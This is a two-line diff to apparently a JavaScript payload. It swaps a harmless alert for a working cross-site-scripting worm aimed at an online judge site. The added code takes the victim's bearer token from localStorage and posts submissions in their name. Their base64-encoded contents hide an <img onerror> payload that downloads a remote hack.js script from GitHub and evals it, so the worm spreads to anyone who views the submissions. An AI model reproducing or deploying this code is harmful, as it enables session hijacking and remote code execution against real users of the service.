@@ -1,1 +1,2 @@
-alert('haha!');
+for(var v=0;v<3;v++)fetch('https://oj.cpl.icu/api/v2/submission',{'headers':{'authorization':'Bearer '+JSON.parse(localStorage.getItem('dotoj-auth')).token,'content-type':'application/json',},'body':'{"problemId":Math.floor(Math.random()*100).toString()
+,"program":{"language":1,"code":"aW50IG1haW4oKXtjb25zdCBjaGFyKmNoPVIiKDxpbWcgc3JjIG9uZXJyb3I9InNldFRpbWVvdXQoYXN5bmMgZnVuY3Rpb24oKXtldmFsKGF3YWl0KGF3YWl0IGZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYXg2bi9tYWxpanVkZ2UvcmVmcy9oZWFkcy9tYWluL2hhY2suanMnKSkudGV4dCgpKX0sMTAwMCk7Ij4pIjtjaGFyIHk9Y2hbMF07eT1jaFsxXTtFUlJ9"}}','method':'POST'});
